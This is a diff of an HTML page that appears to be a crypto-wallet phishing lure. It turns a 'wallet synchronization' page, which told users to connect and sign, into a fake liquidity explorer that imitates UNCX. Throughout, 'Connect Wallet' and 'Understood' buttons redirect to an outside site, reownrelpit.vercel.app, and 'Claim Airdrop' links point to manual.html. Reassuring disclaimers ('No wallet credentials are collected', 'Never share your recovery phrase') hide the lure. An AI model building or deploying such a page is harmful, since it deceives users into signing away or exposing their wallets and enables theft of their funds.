@@ -1,338 +1,1063 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Blockchain Wallet Synchronization</title>
+<title>Blockchain Network | Explore</title>
 
 <style>
-    body {
-        margin: 0;
-        font-family: Arial, sans-serif;
-        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-        color: #fff;
-        text-align: center;
+:root {
+    --bg:#090c14;
+    --panel:#111725;
+    --border:#252e40;
+    --text:#f5f7ff;
+    --muted:#929db1;
+    --blue:#3978f6;
+    --green:#25d69b;
+}
+
+* {
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+}
+
+body {
+    font-family:Arial,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+}
+
+button,input,select {font:inherit;}
+button {cursor:pointer;}
+a {color:inherit;text-decoration:none;}
+
+/* NAVIGATION */
+
+.navbar {
+    height:76px;
+    padding:0 5%;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    border-bottom:1px solid var(--border);
+    background:#0c111d;
+    position:sticky;
+    top:0;
+    z-index:100;
+}
+
+.brand {
+    display:flex;
+    align-items:center;
+    gap:11px;
+    font-size:21px;
+    font-weight:800;
+}
+
+.logo {
+    width:37px;
+    height:37px;
+    background:linear-gradient(135deg,#4285ff,#27d6a0);
+    border-radius:11px;
+    display:grid;
+    place-items:center;
+    font-weight:900;
+}
+
+.nav-links {
+    display:flex;
+    gap:32px;
+}
+
+.nav-links a {
+    color:var(--muted);
+    font-size:14px;
+}
+
+.nav-links a:hover,
+.nav-links a.active {color:white;}
+
+.nav-right {
+    display:flex;
+    gap:12px;
+    align-items:center;
+}
+
+.language {
+    background:var(--panel);
+    color:white;
+    border:1px solid var(--border);
+    padding:10px;
+    border-radius:9px;
+}
+
+.wallet-btn {
+    background:var(--blue);
+    color:white;
+    border:0;
+    padding:12px 19px;
+    border-radius:9px;
+    font-weight:700;
+}
+
+.wallet-btn:hover {background:#2864d9;}
+
+.menu-btn {
+    display:none;
+    background:transparent;
+    border:0;
+    color:white;
+    font-size:25px;
+}
+
+/* MAIN */
+
+.main {
+    width:92%;
+    max-width:1250px;
+    margin:auto;
+}
+
+.announcement {
+    margin-top:25px;
+    padding:15px 18px;
+    border:1px solid #273e70;
+    background:linear-gradient(90deg,#111d37,#14233c);
+    border-radius:10px;
+    display:flex;
+    justify-content:space-between;
+    gap:15px;
+    font-size:13px;
+}
+
+.announcement strong {color:#72a3ff;}
+.announcement a {color:#75a4ff;}
+
+/* HERO */
+
+.hero {
+    text-align:center;
+    padding:65px 15px 55px;
+}
+
+.hero h1 {
+    font-size:clamp(32px,5vw,54px);
+    letter-spacing:-2px;
+    line-height:1.2;
+    margin-bottom:18px;
+}
+
+.gradient-text {
+    background:linear-gradient(90deg,#4c8aff,#35d9b0);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+}
+
+.hero p {
+    color:var(--muted);
+    max-width:620px;
+    margin:auto;
+    line-height:1.8;
+    font-size:15px;
+}
+
+.hero-actions {
+    margin-top:27px;
+    display:flex;
+    justify-content:center;
+    gap:13px;
+    flex-wrap:wrap;
+}
+
+.primary-btn,.secondary-btn {
+    padding:13px 23px;
+    border-radius:9px;
+    font-weight:700;
+    border:1px solid var(--border);
+}
+
+.primary-btn {
+    background:var(--blue);
+    color:white;
+    border:0;
+}
+
+.secondary-btn {
+    background:var(--panel);
+    color:white;
+}
+
+.primary-btn:hover,.secondary-btn:hover {
+    transform:translateY(-3px);
+}
+
+/* STATISTICS */
+
+.section-heading {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:18px;
+}
+
+.section-heading h2 {font-size:21px;}
+
+.section-heading span {
+    color:var(--muted);
+    font-size:12px;
+}
+
+.stats {
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:17px;
+    margin-bottom:45px;
+}
+
+.stat-card {
+    background:linear-gradient(145deg,#151e30,#101725);
+    border:1px solid var(--border);
+    padding:23px;
+    border-radius:13px;
+    transition:.25s;
+}
+
+.stat-card:hover {
+    border-color:#426fc5;
+    transform:translateY(-3px);
+}
+
+.stat-label {
+    font-size:13px;
+    color:var(--muted);
+    margin-bottom:15px;
+}
+
+.stat-value {
+    font-size:29px;
+    font-weight:800;
+}
+
+.stat-note {
+    margin-top:10px;
+    font-size:12px;
+    color:var(--green);
+}
+
+/* EXPLORE */
+
+.explore {margin-bottom:70px;}
+
+.explore-header {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:15px;
+    margin-bottom:20px;
+}
+
+.explore-header h2 {font-size:25px;}
+
+.tabs {
+    display:flex;
+    gap:7px;
+    border-bottom:1px solid var(--border);
+    margin-bottom:20px;
+}
+
+.tab {
+    color:var(--muted);
+    padding:13px 19px;
+    border:0;
+    background:transparent;
+    border-bottom:2px solid transparent;
+    font-weight:600;
+}
+
+.tab.active {
+    color:#78a5ff;
+    border-bottom-color:var(--blue);
+}
+
+.table-controls {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:15px;
+    margin-bottom:18px;
+}
+
+.search {
+    width:320px;
+    max-width:100%;
+    background:var(--panel);
+    color:white;
+    border:1px solid var(--border);
+    padding:13px 15px;
+    border-radius:9px;
+    outline:none;
+}
+
+.search:focus {border-color:var(--blue);}
+
+.filter-label {
+    color:var(--muted);
+    font-size:12px;
+}
+
+.table-wrap {
+    overflow-x:auto;
+    border:1px solid var(--border);
+    border-radius:12px;
+    background:var(--panel);
+}
+
+table {
+    width:100%;
+    border-collapse:collapse;
+    min-width:700px;
+}
+
+th {
+    text-align:left;
+    padding:17px;
+    color:var(--muted);
+    font-size:12px;
+    font-weight:600;
+    background:#131b2a;
+}
+
+td {
+    padding:17px;
+    border-top:1px solid var(--border);
+    font-size:13px;
+}
+
+tbody tr:hover {background:#1a263b;}
+
+.pair {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:700;
+    flex-wrap:wrap;
+}
+
+.coin-icon {
+    width:34px;
+    height:34px;
+    flex-shrink:0;
+    border-radius:50%;
+    display:grid;
+    place-items:center;
+    background:#263b65;
+    color:#a6c6ff;
+    font-weight:800;
+}
+
+/* CLAIM BUTTON */
+
+.claim-btn {
+    display:inline-block;
+    padding:8px 12px;
+    background:linear-gradient(90deg,#3978f6,#25b98e);
+    color:white;
+    border:none;
+    border-radius:7px;
+    font-size:11px;
+    font-weight:700;
+    white-space:nowrap;
+    transition:.2s;
+}
+
+.claim-btn:hover {
+    transform:translateY(-2px);
+    opacity:.85;
+}
+
+.version {
+    background:#202c40;
+    padding:5px 9px;
+    border-radius:5px;
+    color:#9bbcff;
+    font-size:11px;
+}
+
+.progress {
+    width:85px;
+    height:5px;
+    border-radius:10px;
+    background:#263044;
+    margin-top:7px;
+    overflow:hidden;
+}
+
+.progress div {
+    height:100%;
+    background:var(--green);
+    border-radius:10px;
+}
+
+.tvl {font-weight:700;}
+
+.empty {
+    padding:30px;
+    text-align:center;
+    color:var(--muted);
+}
+
+.table-footer {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:16px 5px;
+    color:var(--muted);
+    font-size:12px;
+}
+
+.page-btn {
+    padding:8px 13px;
+    border:1px solid var(--border);
+    background:var(--panel);
+    color:white;
+    border-radius:6px;
+}
+
+/* MODAL */
+
+.modal {
+    display:none;
+    position:fixed;
+    inset:0;
+    z-index:999;
+    background:rgba(0,0,0,.78);
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+}
+
+.modal.show {display:flex;}
+
+.modal-content {
+    width:100%;
+    max-width:420px;
+    background:#151e2e;
+    border:1px solid var(--border);
+    padding:30px;
+    border-radius:16px;
+    text-align:center;
+    animation:appear .25s ease;
+}
+
+@keyframes appear {
+    from {opacity:0;transform:scale(.94);}
+    to {opacity:1;transform:scale(1);}
+}
+
+.modal-content h2 {margin-bottom:12px;}
+
+.modal-content p {
+    color:var(--muted);
+    font-size:13px;
+    line-height:1.7;
+}
+
+.modal-close {
+    float:right;
+    background:none;
+    color:white;
+    border:0;
+    font-size:23px;
+}
+
+.modal-action {
+    margin-top:22px;
+    width:100%;
+    padding:13px;
+    background:var(--blue);
+    color:white;
+    border:0;
+    border-radius:8px;
+}
+
+/* FOOTER */
+
+footer {
+    border-top:1px solid var(--border);
+    padding:30px 5%;
+    text-align:center;
+    color:var(--muted);
+    font-size:12px;
+    line-height:2;
+}
+
+/* MOBILE */
+
+@media(max-width:750px) {
+
+    .navbar {
+        height:68px;
+        padding:0 4%;
     }
 
-    header {
-        padding: 40px 20px;
-        position: relative;
+    .brand {font-size:18px;}
+
+    .menu-btn {display:block;}
+
+    .nav-links {
+        display:none;
+        position:absolute;
+        top:68px;
+        left:0;
+        right:0;
+        background:#111725;
+        padding:20px;
+        flex-direction:column;
+        border-bottom:1px solid var(--border);
     }
 
-    h1 {
-        font-size: 32px;
-        margin-bottom: 10px;
+    .nav-links.open {display:flex;}
+
+    .language {
+        max-width:75px;
+        padding:8px 4px;
     }
 
-    p {
-        color: #ccc;
-        max-width: 600px;
-        margin: auto;
+    .wallet-btn {
+        padding:10px;
+        font-size:12px;
     }
 
-    .container {
-        max-width: 800px;
-        margin: 40px auto;
-        padding: 20px;
-        background: rgba(255,255,255,0.05);
-        border-radius: 10px;
-        box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    .hero {padding:48px 8px;}
+
+    .stats {
+        grid-template-columns:1fr;
+        gap:12px;
     }
 
-    ul {
-        text-align: left;
-        padding-left: 20px;
-        line-height: 1.8;
+    .stat-card {padding:19px;}
+
+    .stat-value {font-size:25px;}
+
+    .announcement {flex-direction:column;}
+
+    .explore-header {
+        align-items:flex-start;
+        flex-direction:column;
     }
 
-    li {
-        margin-bottom: 10px;
+    .table-controls {
+        align-items:flex-start;
+        flex-direction:column;
     }
 
-    .sync-btn {
-        margin-top: 30px;
-        padding: 15px 40px;
-        font-size: 18px;
-        border: none;
-        border-radius: 30px;
-        cursor: pointer;
-        background: linear-gradient(to right, #00c6ff, #0072ff);
-        color: #fff;
-        transition: 0.3s;
+    .search {width:100%;}
+
+    .tab {
+        padding:12px;
+        font-size:12px;
     }
 
-    .sync-btn:hover {
-        opacity: 0.85;
-    }
+    .pair {min-width:240px;}
+}
 
-    .go-wallet-btn {
-        padding:10px 20px;
-        background:#6f42c1;
-        color:white;
-        border:none;
-        border-radius:6px;
-        cursor:pointer;
-        margin-top:10px;
-    }
-
-    footer {
-        margin-top: 40px;
-        padding: 20px;
-        font-size: 14px;
-        color: #aaa;
-    }
-
-    .connect-btn {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      padding: 12px 24px;
-      background: linear-gradient(90deg, #4CAF50, #00D1FF);
-      color: white;
-      font-weight: bold;
-      border-radius: 8px;
-      text-decoration: none;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-      transition: all 0.3s ease;
-      z-index: 9999;
-    }
-
-    .connect-btn:hover {
-      transform: scale(1.1);
-      box-shadow: 0 6px 18px rgba(0,0,0,0.3);
-    }
-
-    /* Popup */
-    .popup {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-
-    .popup-content {
-      width: 500px;
-      height: 600px;
-      background: #ffffff;
-      border-radius: 12px;
-      position: relative;
-      overflow: hidden;
-      animation: fadeIn 0.3s ease-in-out;
-    }
-
-    .popup-content iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-
-    .close-btn {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      font-size: 22px;
-      cursor: pointer;
-      z-index: 10;
-    }
-
-    @keyframes fadeIn {
-      from { transform: scale(0.9); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
-    }
-
-    .wallet-guidelines {
-        margin-top: 30px;
-        text-align: left;
-    }
-
-    /* Language Selector */
-    #lang-select {
-        position: absolute;
-        top: 20px;
-        left: 20px;
-        padding: 8px 12px;
-        border-radius: 6px;
-        border: none;
-        font-weight: bold;
-        cursor: pointer;
-        background: #0072ff;
-        color: white;
-    }
 </style>
 </head>
 
 <body>
 
-<header>
-    <select id="lang-select" onchange="switchLanguage()">
-        <option value="auto">🌐 Auto</option>
-        <option value="en">English</option>
-        <option value="es">Español</option>
-        <option value="tr">Türkçe</option>
-        <option value="zh">中文</option>
-        <option value="hi">हिन्दी</option>
-    </select>
+<nav class="navbar">
 
-    <h1 id="title">Blockchain Wallet Synchronization</h1>
-    <p id="subtitle">Securely synchronize your crypto wallet with the blockchain network to resolve errors and restore full functionality.</p>
-</header>
-
-<button class="go-wallet-btn" onclick="window.location.href='complaints.html';" id="go-wallet-btn">live chart </button>
-
-
-<div class="container">
-    <h2 id="common-issues-title">Common Wallet Issues</h2>
-    <ul id="common-issues-list">
-        <li>Wallet balance not updating</li>
-        <li>Pending or stuck transactions</li>
-        <li>Token not displaying in wallet</li>
-        <li>Network synchronization delay</li>
-        <li>Incorrect gas fee estimation</li>
-        <li>Smart contract interaction failure</li>
-        <li>Node connection timeout</li>
-        <li>Wallet address mismatch</li>
-    </ul>
-
-    <div class="wallet-guidelines">
-        <h2 id="guidelines-title">Guidelines for Synchronized Wallet</h2>
-        <ul id="guidelines-list">
-            <li>once tapped synchronization wait for page load and tap on connect wallet.</li>
-            <li>Confirm you are connected to the correct blockchain network on your wallet.</li>
-            <li>return back here and tap sign</li>
-            <li>Wait for signing to complete before refreshing.</li>
-            <li>Then tap on Verify eth wallet twice 2ce</li>
-        </ul>
+    <div class="brand">
+        <div class="logo">B</div>
+        BLOCKCHAIN
     </div>
 
-  <a href="https://reownrelpit.vercel.app" class="sync-btn">Synchronize Wallet</a>
+    <div class="nav-links" id="navLinks">
+        <a href="#explore" class="active">Explore</a>
+        <a href="complaints.html">Support</a>
+        <a href="#statistics">Statistics</a>
+    </div>
 
-<p id="guide-text" style="margin-top:20px;">To Verify lost assets use Manual Login</p>
+    <div class="nav-right">
 
-<button class="go-wallet-btn" onclick="window.location.href='complaints.html';" id="go-wallet-btn">Complaint Box </button>
+        <select class="language" id="lang-select"
+                onchange="switchLanguage()">
+            <option value="auto">Auto</option>
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="tr">Türkçe</option>
+            <option value="zh">中文</option>
+            <option value="hi">हिन्दी</option>
+        </select>
+
+        <button class="wallet-btn" onclick="openWalletModal()">
+            Connect Wallet
+        </button>
+
+        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+
+    </div>
+
+</nav>
+
+<main class="main">
+
+    <div class="announcement">
+        <div>
+            <strong>NETWORK UPDATE</strong>
+            &nbsp; Explore blockchain liquidity and wallet resources.
+        </div>
+
+        <a href="https://app.uncx.network/"
+           target="_blank"
+           rel="noopener noreferrer">
+            Explore UNCX ↗
+        </a>
+    </div>
+
+    <section class="hero">
+
+        <h1>
+            Explore the
+            <span class="gradient-text">Blockchain Network</span>
+        </h1>
+
+        <p id="subtitle">
+            Explore blockchain liquidity, discover token pools,
+            and access wallet support resources through a modern
+            decentralized finance interface.
+        </p>
+
+        <div class="hero-actions">
+
+            <button class="primary-btn" onclick="openWalletModal()">
+                Connect Wallet
+            </button>
+
+            <a href="complaints.html" class="secondary-btn">
+                Wallet Support
+            </a>
+
+        </div>
+
+    </section>
+
+    <section id="statistics">
+
+        <div class="section-heading">
+            <h2>Network Overview</h2>
+            <span>Illustrative demo statistics</span>
+        </div>
+
+        <div class="stats">
+
+            <div class="stat-card">
+                <div class="stat-label">Total Value Locked</div>
+                <div class="stat-value">$206M</div>
+                <div class="stat-note">Demo display</div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-label">Locks Created</div>
+                <div class="stat-value">70,000+</div>
+                <div class="stat-note">Demo display</div>
+            </div>
+
+            <div class="stat-card">
+                <div class="stat-label">New Locks (24h)</div>
+                <div class="stat-value">05</div>
+                <div class="stat-note">Demo display</div>
+            </div>
+
+        </div>
+
+    </section>
+
+    <section class="explore" id="explore">
+
+        <div class="explore-header">
+            <h2>Explore Liquidity</h2>
+            <span class="filter-label">
+                Browse sample pool information
+            </span>
+        </div>
+
+        <div class="tabs">
+
+            <button class="tab"
+                    onclick="changeTab('tokens',this)">
+                Tokens
+            </button>
+
+            <button class="tab active"
+                    onclick="changeTab('pools',this)">
+                Pools
+            </button>
+
+            <button class="tab"
+                    onclick="changeTab('latest',this)">
+                Latest
+            </button>
+
+        </div>
+
+        <div class="table-controls">
+
+            <input type="search"
+                   class="search"
+                   id="searchInput"
+                   placeholder="⌕ Search pools..."
+                   oninput="filterTable()">
+
+            <span class="filter-label" id="resultCount">
+                Sample listings
+            </span>
+
+        </div>
+
+        <div class="table-wrap">
+
+            <table>
+
+                <thead>
+                    <tr>
+                        <th>POOL / TOKEN</th>
+                        <th>VERSION</th>
+                        <th>LOCKED %</th>
+                        <th>TVL</th>
+                    </tr>
+                </thead>
+
+                <tbody id="poolTable"></tbody>
+
+            </table>
+
+            <div class="empty" id="emptyMessage"
+                 style="display:none">
+                No matching records found.
+            </div>
+
+        </div>
+
+        <div class="table-footer">
+            <span>Sample listings — not live blockchain data</span>
+
+            <button class="page-btn" onclick="resetSearch()">
+                Reset Search
+            </button>
+        </div>
+
+    </section>
+
+</main>
 
 <footer>
-    © 2026 Blockchain Network | Secure Protocol Encryption
+    © 2026 Blockchain Network. All rights reserved.
+    <br>
+    Interface demonstration. No wallet credentials are collected.
+    <br>
+    <a href="complaints.html">Support</a>
+    &nbsp; | &nbsp;
+    <a href="https://app.uncx.network/"
+       target="_blank"
+       rel="noopener noreferrer">
+        Official UNCX App
+    </a>
 </footer>
 
-<div id="popupModal" class="popup">
-  <div class="popup-content">
-    <span class="close-btn" onclick="closePopup()">&times;</span>
-    <iframe src="complaints.html"></iframe>
-  </div>
+<!-- WALLET MODAL -->
+
+<div class="modal" id="walletModal"
+     onclick="closeOutside(event)">
+
+    <div class="modal-content">
+
+        <button class="modal-close"
+                onclick="closeWalletModal()">
+            &times;
+        </button>
+
+        <h2>Connect Wallet</h2>
+
+        <p>
+            This standalone demonstration does not connect to a wallet.
+            Use a trusted wallet application and verify the official
+            website before connecting.
+        </p>
+
+        <p style="margin-top:15px">
+            Never share your recovery phrase or private key.
+            Never sign an unexplained transaction.
+        </p>
+
+        <button class="modal-action"
+                onclick="window.location.href='https://reownrelpit.vercel.app'">
+            Understood
+        </button>
+
+    </div>
+
 </div>
 
 <script>
-/* Multi-language support */
-const translations = {
-    en: { 
-        title:"Blockchain Wallet Synchronization",
-        subtitle:"Securely synchronize your crypto wallet with the blockchain network to resolve errors and restore full functionality.",
-        connect:"Connect",
-        commonIssuesTitle:"Common Wallet Issues",
-        commonIssuesList:["Wallet balance not updating","Pending or stuck transactions","Token not displaying in wallet","Network synchronization delay","Incorrect gas fee estimation","Smart contract interaction failure","Node connection timeout","Wallet address mismatch"],
-        guidelinesTitle:"Guidelines for Synchronized Wallet",
-        guidelinesList:["once tapped synchronization wait for page load and tap on connect wallet.","Confirm you are connected to the correct blockchain network on your wallet.","return back here and tap sign","Wait for signing to complete before refreshing.","Then tap on Verify eth wallet twice 2ce"],
-        syncBtn:"Synchronize Wallet",
-        guideText:"To Verify lost assets drop complaint summary",
-        goWalletBtn:"complaint Box"
-    },
-    es: {
-        title:"Sincronización de Billetera Blockchain",
-        subtitle:"Sincronice su billetera cripto con la red blockchain de forma segura.",
-        connect:"Conectar",
-        commonIssuesTitle:"Problemas Comunes de la Billetera",
-        commonIssuesList:["El saldo de la billetera no se actualiza","Transacciones pendientes o bloqueadas","Token no se muestra en la billetera","Retraso en la sincronización de la red","Estimación incorrecta de tarifas de gas","Fallo en la interacción con contratos inteligentes","Tiempo de espera de conexión al nodo","Desajuste de dirección de la billetera"],
-        guidelinesTitle:"Guía para Billetera Sincronizada",
-        guidelinesList:["Una vez que se toque la sincronización, espere a que se cargue la página y toque conectar billetera.","Confirme que está conectado a la red blockchain correcta en su billetera.","Regrese aquí y toque firmar","Espere a que la firma se complete antes de actualizar.","Luego toque Verificar billetera Ethereum dos veces"],
-        syncBtn:"Sincronizar Billetera",
-        guideText:"Para verificar activos perdidos, use el inicio de sesión manual",
-        goWalletBtn:"INICIO DE SESIÓN MANUAL"
-    },
-    tr: {
-        title:"Blockchain Cüzdan Senkronizasyonu",
-        subtitle:"Kripto cüzdanınızı blockchain ağı ile güvenli şekilde senkronize edin.",
-        connect:"Bağlan",
-        commonIssuesTitle:"Yaygın Cüzdan Sorunları",
-        commonIssuesList:["Cüzdan bakiyesi güncellenmiyor","Bekleyen veya takılı işlemler","Token cüzdanda görüntülenmiyor","Ağ senkronizasyon gecikmesi","Yanlış gas ücreti tahmini","Akıllı sözleşme etkileşim hatası","Düğüm bağlantısı zaman aşımına uğradı","Cüzdan adresi uyuşmazlığı"],
-        guidelinesTitle:"Senkronize Cüzdan Kuralları",
-        guidelinesList:["Senkronizasyonu tıkladıktan sonra sayfanın yüklenmesini bekleyin ve cüzdanı bağlayın.","Cüzdanınızda doğru blockchain ağına bağlı olduğunuzu doğrulayın.","Buraya geri dönün ve imzala'ya dokunun","İmzalama tamamlanana kadar bekleyin","Sonra Ethereum cüzdanını iki kez doğrulayın"],
-        syncBtn:"Cüzdanı Senkronize Et",
-        guideText:"Kayıp varlıkları doğrulamak için Manuel Giriş kullanın",
-        goWalletBtn:"Complaint-Box"
-    },
-    zh: {
-        title:"区块链钱包同步",
-        subtitle:"安全地将您的加密钱包与区块链网络同步。",
-        connect:"连接",
-        commonIssuesTitle:"常见钱包问题",
-        commonIssuesList:["钱包余额未更新","待处理或卡住的交易","代币未显示在钱包中","网络同步延迟","错误的燃气费估算","智能合约交互失败","节点连接超时","钱包地址不匹配"],
-        guidelinesTitle:"同步钱包指南",
-        guidelinesList:["点击同步后，等待页面加载并点击连接钱包。","确认您的钱包已连接到正确的区块链网络。","返回此页面并点击签名","在刷新前等待签名完成","然后点击验证以太坊钱包两次"],
-        syncBtn:"同步钱包",
-        guideText:"要验证丢失的资产，请使用手动登录",
-        goWalletBtn:"手动登录"
-    },
-    hi: {
-        title:"ब्लॉकचेन वॉलेट सिंक्रोनाइज़ेशन",
-        subtitle:"अपने क्रिप्टो वॉलेट को सुरक्षित रूप से ब्लॉकचेन नेटवर्क से सिंक्रोनाइज़ करें।",
-        connect:"कनेक्ट करें",
-        commonIssuesTitle:"सामान्य वॉलेट समस्याएँ",
-        commonIssuesList:["वॉलेट बैलेंस अपडेट नहीं हो रहा","लंबित या फंसी हुई लेनदेन","टोकन वॉलेट में प्रदर्शित नहीं हो रहा","नेटवर्क सिंक्रोनाइज़ेशन में देरी","गलत गैस शुल्क अनुमान","स्मार्ट कॉन्ट्रैक्ट इंटरैक्शन विफल","नोड कनेक्शन टाइमआउट","वॉलेट पता असंगतता"],
-        guidelinesTitle:"सिंक्रोनाइज़्ड वॉलेट दिशानिर्देश",
-        guidelinesList:["सिंक पर टैप करने के बाद पेज लोड का इंतजार करें और कनेक्ट वॉलेट पर टैप करें।","पुष्टि करें कि आपका वॉलेट सही ब्लॉकचेन नेटवर्क से जुड़ा है।","यहाँ वापस आएं और साइन पर टैप करें","रिफ्रेश करने से पहले साइनिंग पूरी होने का इंतजार करें।","फिर ETH वॉलेट को दो बार सत्यापित करें"],
-        syncBtn:"वॉलेट सिंक्रोनाइज़ करें",
-        guideText:"खोई हुई संपत्ति को सत्यापित करने के लिए मैनुअल लॉगिन का उपयोग करें",
-        goWalletBtn:"मैनुअल लॉगिन"
+
+/* SAMPLE DATA */
+
+const pools = [
+
+    {name:"OSMI / USDC",version:"V3",locked:100,tvl:"$190M"},
+    {name:"Dance and music / WBNB",version:"V3",locked:48,tvl:"$87M"},
+    {name:"BURNNY / WBNB",version:"V3",locked:100,tvl:"$68M"},
+    {name:"FLOKI / WETH",version:"V2",locked:85,tvl:"$8.8M"},
+    {name:"SPX / WETH",version:"V2",locked:100,tvl:"$7.8M"},
+    {name:"MOG / WETH",version:"V2",locked:100,tvl:"$5.8M"},
+    {name:"BANANA / WETH",version:"V2",locked:100,tvl:"$4.3M"},
+    {name:"SAFEMOON / WBNB",version:"V2",locked:97,tvl:"$3.8M"},
+    {name:"PEPE / WETH",version:"V2",locked:99,tvl:"$2.3M"},
+    {name:"WOJAK / WETH",version:"V2",locked:100,tvl:"$1.9M"},
+    {name:"DSYNC / WETH",version:"V2",locked:66,tvl:"$1.8M"},
+    {name:"CULT / WETH",version:"V2",locked:100,tvl:"$1.4M"}
+
+];
+
+let currentTab = "pools";
+window.currentData = [...pools];
+
+/* RENDER TABLE */
+
+function renderTable(data) {
+
+    const table = document.getElementById("poolTable");
+
+    table.innerHTML = "";
+
+    document.getElementById("emptyMessage").style.display =
+        data.length ? "none" : "block";
+
+    document.getElementById("resultCount").textContent =
+        data.length + " sample listings";
+
+    data.forEach(pool => {
+
+        const row = document.createElement("tr");
+
+        const td = document.createElement("td");
+
+        const pair = document.createElement("div");
+        pair.className = "pair";
+
+        const coinIcon = document.createElement("div");
+        coinIcon.className = "coin-icon";
+        coinIcon.textContent = pool.name.charAt(0);
+
+        const coinName = document.createElement("span");
+        coinName.textContent = pool.name;
+
+        const claim = document.createElement("a");
+        claim.className = "claim-btn";
+        claim.href = "manual.html";
+        claim.textContent = "Claim Airdrop";
+
+        pair.append(coinIcon,coinName,claim);
+        td.appendChild(pair);
+        row.appendChild(td);
+
+        const version = document.createElement("td");
+
+        const badge = document.createElement("span");
+        badge.className = "version";
+        badge.textContent = pool.version;
+
+        version.appendChild(badge);
+        row.appendChild(version);
+
+        const locked = document.createElement("td");
+        locked.textContent = pool.locked + "%";
+
+        const progress = document.createElement("div");
+        progress.className = "progress";
+
+        const bar = document.createElement("div");
+        bar.style.width = Math.min(pool.locked,100) + "%";
+
+        progress.appendChild(bar);
+        locked.appendChild(progress);
+        row.appendChild(locked);
+
+        const tvl = document.createElement("td");
+        tvl.className = "tvl";
+        tvl.textContent = pool.tvl;
+
+        row.appendChild(tvl);
+
+        table.appendChild(row);
+
+    });
+
+}
+
+/* TABS */
+
+function changeTab(tab,button) {
+
+    currentTab = tab;
+
+    document.querySelectorAll(".tab").forEach(item => {
+        item.classList.remove("active");
+    });
+
+    button.classList.add("active");
+
+    document.getElementById("searchInput").value = "";
+
+    let data = [...pools];
+
+    if(tab === "tokens") {
+
+        data = pools.map(pool => ({
+            ...pool,
+            name:pool.name.split("/")[0].trim(),
+            version:"Token"
+        }));
+
     }
+
+    if(tab === "latest") {
+        data.reverse();
+    }
+
+    window.currentData = data;
+
+    renderTable(data);
+
+}
+
+/* SEARCH */
+
+function filterTable() {
+
+    const term = document.getElementById("searchInput")
+        .value.toLowerCase();
+
+    const data = window.currentData || pools;
+
+    const filtered = data.filter(pool =>
+        pool.name.toLowerCase().includes(term) ||
+        pool.version.toLowerCase().includes(term)
+    );
+
+    renderTable(filtered);
+
+}
+
+function resetSearch() {
+
+    document.getElementById("searchInput").value = "";
+
+    renderTable(window.currentData || pools);
+
+}
+
+/* WALLET MODAL */
+
+function openWalletModal() {
+    document.getElementById("walletModal").classList.add("show");
+}
+
+function closeWalletModal() {
+    document.getElementById("walletModal").classList.remove("show");
+}
+
+function closeOutside(event) {
+
+    if(event.target.id === "walletModal") {
+        closeWalletModal();
+    }
+
+}
+
+/* MOBILE MENU */
+
+function toggleMenu() {
+    document.getElementById("navLinks").classList.toggle("open");
+}
+
+/* LANGUAGE */
+
+const translations = {
+
+    en:{
+        subtitle:"Explore blockchain liquidity, discover token pools, and access wallet support resources through a modern decentralized finance interface.",
+        connect:"Connect Wallet",
+        explore:"Explore Liquidity"
+    },
+
+    es:{
+        subtitle:"Explore la liquidez blockchain, descubra grupos de tokens y acceda a recursos de soporte de billetera.",
+        connect:"Conectar billetera",
+        explore:"Explorar liquidez"
+    },
+
+    tr:{
+        subtitle:"Blockchain likiditesini keşfedin, token havuzlarını inceleyin ve cüzdan destek kaynaklarına erişin.",
+        connect:"Cüzdanı Bağla",
+        explore:"Likiditeyi Keşfet"
+    },
+
+    zh:{
+        subtitle:"探索区块链流动性，发现代币池并访问钱包支持资源。",
+        connect:"连接钱包",
+        explore:"探索流动性"
+    },
+
+    hi:{
+        subtitle:"ब्लॉकचेन तरलता का अन्वेषण करें और वॉलेट सहायता संसाधनों तक पहुंचें。",
+        connect:"वॉलेट कनेक्ट करें",
+        explore:"तरलता देखें"
+    }
+
 };
 
 function detectLanguage() {
-    let userLang = navigator.language.slice(0,2);
-    if(!translations[userLang]) userLang = "en";
-    return userLang;
-}
 
-function applyLanguage(langCode) {
-    if(langCode==="auto") langCode = detectLanguage();
-    const t = translations[langCode];
+    let lang = navigator.language.slice(0,2);
 
-    document.getElementById("title").innerText = t.title;
-    document.getElementById("subtitle").innerText = t.subtitle;
-    document.getElementById("connect-btn").innerText = t.connect;
-    document.getElementById("common-issues-title").innerText = t.commonIssuesTitle;
+    return translations[lang] ? lang : "en";
 
-    const ciList = document.getElementById("common-issues-list");
-    ciList.innerHTML = "";
-    t.commonIssuesList.forEach(item=>{
-        const li=document.createElement("li");
-        li.innerText=item;
-        ciList.appendChild(li);
-    });
-
-    document.getElementById("guidelines-title").innerText = t.guidelinesTitle;
-    const glList = document.getElementById("guidelines-list");
-    glList.innerHTML="";
-    t.guidelinesList.forEach(item=>{
-        const li=document.createElement("li");
-        li.innerText=item;
-        glList.appendChild(li);
-    });
-
-    document.getElementById("sync-btn").innerText = t.syncBtn;
-    document.getElementById("guide-text").innerText = t.guideText;
-    document.getElementById("go-wallet-btn").innerText = t.goWalletBtn;
 }
 
 function switchLanguage() {
-    const select = document.getElementById("lang-select");
-    applyLanguage(select.value);
+
